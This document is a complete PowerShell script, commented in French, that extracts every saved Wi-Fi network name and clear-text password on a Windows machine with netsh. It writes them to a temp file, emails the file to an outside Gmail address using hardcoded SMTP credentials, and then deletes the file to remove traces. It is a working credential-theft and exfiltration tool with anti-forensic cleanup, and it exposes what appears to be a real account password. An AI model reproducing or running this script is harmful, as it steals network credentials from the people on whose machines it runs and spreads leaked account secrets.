# Configuration de l'email
$smtpServer = "smtp.gmail.com"
$smtpFrom = "freeguns0725@gmail.com"
$smtpTo = "gabriel.deschamps.pro@gmail.com"
$messageSubject = "WiFi SSID and Passwords"
$messageBody = "Attached is the WiFi SSID and Passwords file."
$smtpUser = "freeguns0725@gmail.com"
$smtpPassword = "dnku mukw cxac idov"
$attachmentPath = "$env:temp\wifi_passwords.txt"

# Récupérer les SSID et mots de passe Wi-Fi
$wifiProfiles = netsh wlan show profiles | Select-String "Profil Tous les utilisateurs" | ForEach-Object { $_.Line.Split(":")[1].Trim() }
$output = @()

foreach ($profile in $wifiProfiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $password = ($details | Select-String "Contenu de la clé" | ForEach-Object { $_.Line.Split(":")[1].Trim() })
    if ($password) {
        $output += "$profile : $password"
    } else {
        $output += "$profile : No password found"
    }
}

# Écrire les résultats dans un fichier
$output | Out-File -FilePath $attachmentPath

# Envoyer le fichier par email
$mailMessage = New-Object system.net.mail.mailmessage
$mailMessage.from = $smtpFrom
$mailMessage.To.Add($smtpTo)
$mailMessage.Subject = $messageSubject
$mailMessage.Body = $messageBody
$mailMessage.Attachments.Add($attachmentPath)

$smtp = New-Object Net.Mail.SmtpClient($smtpServer, 587)
$smtp.EnableSsl = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $smtpPassword)

$smtp.Send($mailMessage)

# Supprimer le fichier et les traces
Remove-Item -Path $attachmentPath
